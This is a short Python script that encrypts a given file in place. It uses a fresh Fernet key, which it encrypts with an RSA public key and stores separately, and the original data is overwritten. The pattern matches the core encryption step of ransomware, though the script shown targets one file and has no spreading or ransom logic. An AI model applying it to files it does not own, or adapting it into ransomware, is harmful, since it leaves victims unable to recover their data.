import sys

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

from cryptography.fernet import Fernet # provides an API for working with symmetric key cryptography

symmetricKey = Fernet.generate_key() # generate key

FernetInst = Fernet(symmetricKey) # Fernet init

with open('public.key','rb') as keyf: # you must generate and extract the public key yourself, see the README for more details
    public_key = serialization.load_pem_public_key(
        keyf.read(),
        backend = default_backend()
    )

encryptedSymKey = public_key.encrypt(
    symmetricKey,
    padding.OAEP( # using OAEP algorithm
        mgf = padding.MGF1(algorithm = hashes.SHA256()),
        algorithm = hashes.SHA256(), # use SHA256 cryptography function
        label = None
    )
)

with open('encSynKey.key','wb') as keyf: # writing encryptedSymKey key in encSynKey.key
    keyf.write(encryptedSymKey)

FILE_PATH = sys.argv[1] # take the file

with open(FILE_PATH, 'rb') as f:
    file_data = f.read() # take the data
    encrypted_data = FernetInst.encrypt(file_data) # encrypt

with open(FILE_PATH, 'wb') as f: # write it back
    f.write(encrypted_data)

quit()
